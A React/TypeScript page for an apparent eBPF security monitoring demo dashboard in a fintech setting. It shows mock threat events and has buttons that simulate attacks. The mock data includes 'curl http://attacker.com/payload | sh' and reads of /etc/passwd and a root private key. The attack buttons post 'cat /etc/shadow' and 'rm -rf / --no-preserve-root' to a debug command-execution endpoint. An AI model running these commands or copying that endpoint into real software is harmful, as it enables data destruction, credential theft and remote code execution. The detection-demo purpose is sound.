import React, { useState, useEffect } from 'react';
import {
  Row,
  Col,
  Card,
  Typography,
  Table,
  Tag,
  Badge,
  Button,
  Space,
  Divider,
  Alert,
  Timeline,
  Statistic,
  Progress,
  Switch,
  Input,
  Select,
  DatePicker,
  Tabs,
} from 'antd';
import {
  SecurityScanOutlined,
  WarningOutlined,
  FileOutlined,
  GlobalOutlined,
  CodeOutlined,
  PlayCircleOutlined,
  StopOutlined,
  ReloadOutlined,
  ExportOutlined,
  SearchOutlined,
  ExperimentOutlined,
  EyeOutlined,
  SafetyCertificateOutlined,
} from '@ant-design/icons';

// 導入安全測試組件
import SecurityTesting from './SecurityTesting';
// 導入Tetragon事件流組件
import TetragonEventStream from '../../components/TetragonEventStream';

const { Title, Text, Paragraph } = Typography;
const { Search } = Input;
const { Option } = Select;
const { RangePicker } = DatePicker;
const { TabPane } = Tabs;

// 定義事件詳情的類型
interface NetworkConnectionDetails {
  destination: string;
  port: number;
  protocol: string;
}

interface FileAccessDetails {
  filename: string;
  mode: string;
  userId: number;
}

interface CommandExecutionDetails {
  command: string;
  parentProcess: string;
  args: string[];
}

interface CryptoOperationDetails {
  operation: string;
  keyfile: string;
  algorithm: string;
}

// 聯合類型
type EventDetails =
  | NetworkConnectionDetails
  | FileAccessDetails
  | CommandExecutionDetails
  | CryptoOperationDetails
  | Record<string, any>;

// 安全事件接口
interface SecurityEvent {
  key: string;
  timestamp: string;
  processId: number;
  processName: string;
  eventType: string;
  description: string;
  details: EventDetails;
  severity: string;
  service: string;
  podName: string;
  namespace: string;
  action: string;
}

// 模擬eBPF安全事件數據
const mockSecurityEvents: SecurityEvent[] = [
  {
    key: '1',
    timestamp: '2023-12-01 10:45:12.123',
    processId: 12345,
    processName: 'curl',
    eventType: 'NETWORK_CONNECTION',
    description: '外部DNS查詢到可疑域名',
    details: {
      destination: 'malicious-domain.com',
      port: 53,
      protocol: 'UDP',
    },
    severity: 'CRITICAL',
    service: 'payment-gateway',
    podName: 'payment-gateway-7d8f9c6b5-x2m4n',
    namespace: 'fintech-demo',
    action: 'ALLOWED',
  },
  {
    key: '2',
    timestamp: '2023-12-01 10:42:33.456',
    processId: 9876,
    processName: 'cat',
    eventType: 'FILE_ACCESS',
    description: '讀取敏感系統文件',
    details: {
      filename: '/etc/passwd',
      mode: 'READ',
      userId: 0,
    },
    severity: 'HIGH',
    service: 'trading-api',
    podName: 'trading-api-6f4d8c9b2-k8s7p',
    namespace: 'fintech-demo',
    action: 'ALLOWED',
  },
  {
    key: '3',
    timestamp: '2023-12-01 10:40:15.789',
    processId: 5432,
    processName: 'sh',
    eventType: 'COMMAND_EXECUTION',
    description: '執行可疑的shell命令',
    details: {
      command: 'curl http://attacker.com/payload | sh',
      parentProcess: 'risk-engine',
      args: ['-c', 'curl http://attacker.com/payload | sh'],
    },
    severity: 'CRITICAL',
    service: 'risk-engine',
    podName: 'risk-engine-5c7b8d4f6-m9n3x',
    namespace: 'fintech-demo',
    action: 'BLOCKED',
  },
  {
    key: '4',
    timestamp: '2023-12-01 10:38:45.012',
    processId: 7891,
    processName: 'openssl',
    eventType: 'CRYPTO_OPERATION',
    description: '加密操作異常',
    details: {
      operation: 'decrypt',
      keyfile: '/root/.private_key',
      algorithm: 'AES-256',
    },
    severity: 'MEDIUM',
    service: 'audit-service',
    podName: 'audit-service-8b5c7d9e1-p4q6r',
    namespace: 'fintech-demo',
    action: 'MONITORED',
  },
];

const Security: React.FC = () => {
  const [realTimeMode, setRealTimeMode] = useState(true);
  const [events, setEvents] = useState<SecurityEvent[]>(mockSecurityEvents);
  const [filteredEvents, setFilteredEvents] = useState<SecurityEvent[]>(mockSecurityEvents);
  const [loading, setLoading] = useState(false);
  const [selectedEventType, setSelectedEventType] = useState<string>('ALL');
  const [selectedSeverity, setSelectedSeverity] = useState<string>('ALL');

  // 模擬實時事件更新
  useEffect(() => {
    if (!realTimeMode) return;

    const interval = setInterval(() => {
      const eventTypes = ['NETWORK_CONNECTION', 'FILE_ACCESS', 'COMMAND_EXECUTION'];
      const selectedEventType = eventTypes[Math.floor(Math.random() * eventTypes.length)];
      const processNames = ['curl', 'wget', 'nc', 'python', 'sh', 'bash'];
      const selectedProcess = processNames[Math.floor(Math.random() * processNames.length)];
      const services = ['trading-api', 'risk-engine', 'payment-gateway', 'audit-service'];
      const selectedService = services[Math.floor(Math.random() * services.length)];

      // 根據事件類型生成對應的詳細信息
      let details: EventDetails;
      switch (selectedEventType) {
        case 'NETWORK_CONNECTION':
          details = {
            destination: `${Math.random() > 0.5 ? 'suspicious-site.com' : 'api.example.com'}`,
            port: Math.floor(Math.random() * 65535),
            protocol: Math.random() > 0.5 ? 'TCP' : 'UDP',
          } as NetworkConnectionDetails;
          break;
        case 'FILE_ACCESS':
          details = {
            filename: Math.random() > 0.5 ? '/etc/passwd' : '/tmp/data.txt',
            mode: Math.random() > 0.5 ? 'READ' : 'WRITE',
            userId: Math.floor(Math.random() * 1000),
          } as FileAccessDetails;
          break;
        case 'COMMAND_EXECUTION':
          details = {
            command: `${selectedProcess} script.sh`,
            parentProcess: selectedService,
            args: ['-c', 'some command'],
          } as CommandExecutionDetails;
          break;
        default:
          details = {};
      }

      // 模擬新的安全事件
      const newEvent: SecurityEvent = {
        key: `${Date.now()}`,
        timestamp: new Date().toLocaleString('zh-TW', {
          year: 'numeric',
          month: '2-digit',
          day: '2-digit',
          hour: '2-digit',
          minute: '2-digit',
          second: '2-digit',
          hour12: false,
        }),
        processId: Math.floor(Math.random() * 99999),
        processName: selectedProcess,
        eventType: selectedEventType,
        description: '新檢測到的安全事件',
        details,
        severity: ['LOW', 'MEDIUM', 'HIGH', 'CRITICAL'][Math.floor(Math.random() * 4)],
        service: selectedService,
        podName: `${selectedService}-${Math.random().toString(36).substring(2, 8)}`,
        namespace: 'fintech-demo',
        action: ['ALLOWED', 'BLOCKED', 'MONITORED'][Math.floor(Math.random() * 3)],
      };

      setEvents((prev) => {
        // 確保不超過50個事件，避免性能問題
        const newEvents = [newEvent, ...prev];
        return newEvents.length > 50 ? newEvents.slice(0, 50) : newEvents;
      });
    }, 5000);

    return () => {
      clearInterval(interval);
    };
  }, [realTimeMode]);

  // 過濾事件
  useEffect(() => {
    let filtered = events;

    if (selectedEventType !== 'ALL') {
      filtered = filtered.filter((event) => event.eventType === selectedEventType);
    }

    if (selectedSeverity !== 'ALL') {
      filtered = filtered.filter((event) => event.severity === selectedSeverity);
    }

    setFilteredEvents(filtered);
  }, [events, selectedEventType, selectedSeverity]);

  // 獲取嚴重性標籤
  const getSeverityTag = (severity: string) => {
    const severityConfig = {
      CRITICAL: { color: 'red', text: '嚴重' },
      HIGH: { color: 'orange', text: '高' },
      MEDIUM: { color: 'yellow', text: '中' },
      LOW: { color: 'green', text: '低' },
    };
    const config = severityConfig[severity as keyof typeof severityConfig] || {
      color: 'default',
      text: severity,
    };
    return <Tag color={config.color}>{config.text}</Tag>;
  };

  // 獲取事件類型標籤
  const getEventTypeTag = (eventType: string) => {
    const typeConfig = {
      FILE_ACCESS: { color: 'blue', icon: <FileOutlined />, text: '文件訪問' },
      NETWORK_CONNECTION: { color: 'purple', icon: <GlobalOutlined />, text: '網絡連接' },
      COMMAND_EXECUTION: { color: 'red', icon: <CodeOutlined />, text: '命令執行' },
      CRYPTO_OPERATION: { color: 'gold', icon: <SecurityScanOutlined />, text: '加密操作' },
    };
    const config = typeConfig[eventType as keyof typeof typeConfig] || {
      color: 'default',
      icon: <WarningOutlined />,
      text: eventType,
    };
    return (
      <Tag color={config.color} icon={config.icon}>
        {config.text}
      </Tag>
    );
  };

  // 獲取動作標籤
  const getActionTag = (action: string) => {
    const actionConfig = {
      ALLOWED: { color: 'green', text: '允許' },
      BLOCKED: { color: 'red', text: '阻止' },
      MONITORED: { color: 'blue', text: '監控' },
    };
    const config = actionConfig[action as keyof typeof actionConfig] || {
      color: 'default',
      text: action,
    };
    return <Tag color={config.color}>{config.text}</Tag>;
  };

  // 觸發模擬攻擊
  const triggerMockAttack = async (attackType: string) => {
    setLoading(true);
    try {
      // 模擬調用後端API觸發安全事件
      const response = await fetch(`/api/trading/debug/execute`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          command: attackType === 'file' ? 'cat' : attackType === 'network' ? 'curl' : 'sh',
          args:
            attackType === 'file'
              ? ['/etc/shadow']
              : attackType === 'network'
                ? ['http://malicious-site.com']
                : ['-c', 'rm -rf / --no-preserve-root'],
        }),
      });
    } catch (error) {
      console.log('模擬攻擊觸發:', attackType);
    } finally {
      setLoading(false);
    }
  };

  const eventColumns = [
    {
      title: '時間',
      dataIndex: 'timestamp',
      key: 'timestamp',
      width: 180,
      render: (timestamp: string) => (
        <Text code style={{ fontSize: '12px' }}>
          {timestamp}
        </Text>
      ),
    },
    {
      title: '事件類型',
      dataIndex: 'eventType',
      key: 'eventType',
      width: 140,
      render: getEventTypeTag,
    },
    {
      title: '嚴重性',
      dataIndex: 'severity',
      key: 'severity',
      width: 80,
      render: getSeverityTag,
    },
    {
      title: '進程',
      key: 'process',
      width: 120,
      render: (record: SecurityEvent) => (
        <Space direction="vertical" size={0}>
          <Text strong>{record.processName}</Text>
          <Text type="secondary" style={{ fontSize: '12px' }}>
            PID: {record.processId}
          </Text>
        </Space>
      ),
    },
    {
      title: '描述',
      dataIndex: 'description',
      key: 'description',
      ellipsis: true,
    },
    {
      title: '服務',
      dataIndex: 'service',
      key: 'service',
      width: 120,
      render: (service: string) => <Tag>{service}</Tag>,
    },
    {
      title: '動作',
      dataIndex: 'action',
      key: 'action',
      width: 80,
      render: getActionTag,
    },
  ];

  // 統計數據
  const stats = {
    total: filteredEvents.length,
    critical: filteredEvents.filter((e) => e.severity === 'CRITICAL').length,
    high: filteredEvents.filter((e) => e.severity === 'HIGH').length,
    blocked: filteredEvents.filter((e) => e.action === 'BLOCKED').length,
  };

  return (
    <div style={{ padding: '24px' }}>
      {/* 頁面標題 */}
      <Row gutter={[24, 24]}>
        <Col span={24}>
          <Card>
            <Space align="center">
              <SecurityScanOutlined style={{ fontSize: '32px', color: '#ff4d4f' }} />
              <div>
                <Title level={2} style={{ margin: 0 }}>
                  🛡️ 安全監控中心
                </Title>
                <Text type="secondary">eBPF實時安全監控與威脅檢測平台</Text>
              </div>
            </Space>
          </Card>
        </Col>
      </Row>

      {/* 主要內容標籤頁 */}
      <Row gutter={[24, 24]}>
        <Col span={24}>
          <Tabs defaultActiveKey="monitoring" size="large">
            <TabPane
              tab={
                <span>
                  <EyeOutlined />
                  實時監控
                </span>
              }
              key="monitoring"
            >
              {/* 實時監控內容 - 保持原有的監控功能 */}
              {renderMonitoringContent()}
            </TabPane>

            <TabPane
              tab={
                <span>
                  <ExperimentOutlined />
                  安全測試
                </span>
              }
              key="testing"
            >
              {/* 安全測試內容 */}
              <SecurityTesting />
            </TabPane>

            <TabPane
              tab={
                <span>
                  <SafetyCertificateOutlined />
                  Tetragon事件流
                </span>
              }
              key="tetragon"
            >
              {/* Tetragon事件流內容 */}
              <TetragonEventStream />
            </TabPane>
          </Tabs>
        </Col>
      </Row>
    </div>
  );

  // 渲染監控內容的函數
  function renderMonitoringContent() {
    return (
      <>
        {/* 原有的監控內容 */}
        {/* 控制面板 */}
        <Row gutter={[16, 16]} style={{ marginBottom: 16 }}>
          <Col xs={24} sm={8}>
            <Card size="small">
              <Space>
                <Text strong>實時監控:</Text>
                <Switch
                  checked={realTimeMode}
                  onChange={setRealTimeMode}
                  checkedChildren="開啟"
                  unCheckedChildren="關閉"
                />
              </Space>
            </Card>
          </Col>
          <Col xs={24} sm={16}>
            <Card size="small">
              <Space wrap>
                <Button
                  icon={<ReloadOutlined />}
                  onClick={() => window.location.reload()}
                  size="small"
                >
                  刷新
                </Button>
                <Button icon={<ExportOutlined />} size="small">
                  導出報告
                </Button>
                <Button
                  icon={<StopOutlined />}
                  onClick={() => setRealTimeMode(false)}
                  size="small"
                  danger={realTimeMode}
                >
                  停止監控
                </Button>
              </Space>
            </Card>
          </Col>
        </Row>

        {/* 統計卡片 */}
        <Row gutter={[16, 16]} style={{ marginBottom: 16 }}>
          <Col xs={24} sm={6}>
            <Card>
              <Statistic
                title="總事件數"
                value={stats.total}
                prefix={<SecurityScanOutlined />}
                valueStyle={{ color: '#1890ff' }}
              />
            </Card>
          </Col>
          <Col xs={24} sm={6}>
            <Card>
              <Statistic
                title="嚴重事件"
                value={stats.critical}
                prefix={<WarningOutlined />}
                valueStyle={{ color: '#cf1322' }}
              />
            </Card>
          </Col>
          <Col xs={24} sm={6}>
            <Card>
              <Statistic
                title="高危事件"
                value={stats.high}
                prefix={<WarningOutlined />}
                valueStyle={{ color: '#fa8c16' }}
              />
            </Card>
          </Col>
          <Col xs={24} sm={6}>
            <Card>
              <Statistic
                title="已阻止"
                value={stats.blocked}
                prefix={<StopOutlined />}
                valueStyle={{ color: '#52c41a' }}
              />
            </Card>
          </Col>
        </Row>

        {/* 威脅級別警告 */}
        {stats.critical > 0 && (
          <Alert
            message="🚨 檢測到嚴重安全威脅"
            description={`發現 ${stats.critical} 個嚴重安全事件，建議立即檢查系統安全狀態。`}
            type="error"
            showIcon
            closable
            style={{ marginBottom: '16px' }}
          />
        )}

        {/* 事件過濾和搜索 */}
        <Row gutter={[16, 16]} style={{ marginBottom: 16 }}>
          <Col xs={24}>
            <Card title="事件過濾">
              <Row gutter={[16, 16]}>
                <Col xs={24} sm={8}>
                  <Search placeholder="搜索事件描述..." prefix={<SearchOutlined />} allowClear />
                </Col>
                <Col xs={24} sm={4}>
                  <Select
                    value={selectedEventType}
                    onChange={setSelectedEventType}
                    style={{ width: '100%' }}
                    placeholder="事件類型"
                  >
                    <Option value="ALL">所有類型</Option>
                    <Option value="FILE_ACCESS">文件訪問</Option>
                    <Option value="NETWORK_CONNECTION">網絡連接</Option>
                    <Option value="COMMAND_EXECUTION">命令執行</Option>
                    <Option value="CRYPTO_OPERATION">加密操作</Option>
                  </Select>
                </Col>
                <Col xs={24} sm={4}>
                  <Select
                    value={selectedSeverity}
                    onChange={setSelectedSeverity}
                    style={{ width: '100%' }}
                    placeholder="嚴重性"
                  >
                    <Option value="ALL">所有級別</Option>
                    <Option value="CRITICAL">嚴重</Option>
                    <Option value="HIGH">高</Option>
                    <Option value="MEDIUM">中</Option>
                    <Option value="LOW">低</Option>
                  </Select>
                </Col>
                <Col xs={24} sm={8}>
                  <RangePicker style={{ width: '100%' }} />
                </Col>
              </Row>
            </Card>
          </Col>
        </Row>

        {/* 攻擊模擬測試 */}
        <Row gutter={[16, 16]} style={{ marginBottom: 16 }}>
          <Col xs={24}>
            <Card title="🧪 安全測試模擬">
              <Paragraph>
                點擊下方按鈕模擬不同類型的安全攻擊，觀察 eBPF 監控系統的檢測能力：
              </Paragraph>
              <Space wrap>
                <Button
                  icon={<FileOutlined />}
                  loading={loading}
                  onClick={() => triggerMockAttack('file')}
                  danger
                >
                  文件訪問攻擊
                </Button>
                <Button
                  icon={<GlobalOutlined />}
                  loading={loading}
                  onClick={() => triggerMockAttack('network')}
                  danger
                >
                  網絡連接攻擊
                </Button>
                <Button
                  icon={<CodeOutlined />}
                  loading={loading}
                  onClick={() => triggerMockAttack('command')}
                  danger
                >
                  命令執行攻擊
                </Button>
                <Button
                  icon={<PlayCircleOutlined />}
                  loading={loading}
                  onClick={() => triggerMockAttack('privilege')}
                  danger
                >
                  權限提升攻擊
                </Button>
              </Space>
            </Card>
          </Col>
        </Row>

        {/* 實時事件流 */}
        <Row gutter={[16, 16]}>
          <Col xs={24}>
            <Card
              title={
                <Space>
                  實時安全事件
                  {realTimeMode && <Badge status="processing" text="實時監控中" />}
                </Space>
              }
              extra={<Text type="secondary">顯示最近 {filteredEvents.length} 個事件</Text>}
            >
              <Table
                columns={eventColumns}
                dataSource={filteredEvents}
                pagination={{
                  pageSize: 20,
                  showSizeChanger: true,
                  showQuickJumper: true,
                  showTotal: (total) => `共 ${total} 個事件`,
                }}
                size="small"
                scroll={{ x: 1200 }}
                expandable={{
                  expandedRowRender: (record: SecurityEvent) => (
                    <div style={{ padding: '16px', background: '#fafafa' }}>
                      <Row gutter={[16, 16]}>
                        <Col span={12}>
                          <Title level={5}>事件詳情</Title>
                          <Space direction="vertical">
                            <Text>
                              <strong>Pod名稱:</strong> {record.podName}
                            </Text>
                            <Text>
                              <strong>命名空間:</strong> {record.namespace}
                            </Text>
                            <Text>
                              <strong>進程ID:</strong> {record.processId}
                            </Text>
                            <Text>
                              <strong>進程名稱:</strong> {record.processName}
                            </Text>
                          </Space>
                        </Col>
                        <Col span={12}>
                          <Title level={5}>詳細信息</Title>
                          <pre style={{ background: '#f5f5f5', padding: '8px', fontSize: '12px' }}>
                            {JSON.stringify(record.details || {}, null, 2)}
                          </pre>
                        </Col>
                      </Row>
                    </div>
                  ),
                }}
              />
            </Card>
          </Col>
        </Row>
      </>
    );
  }
};

export default Security;
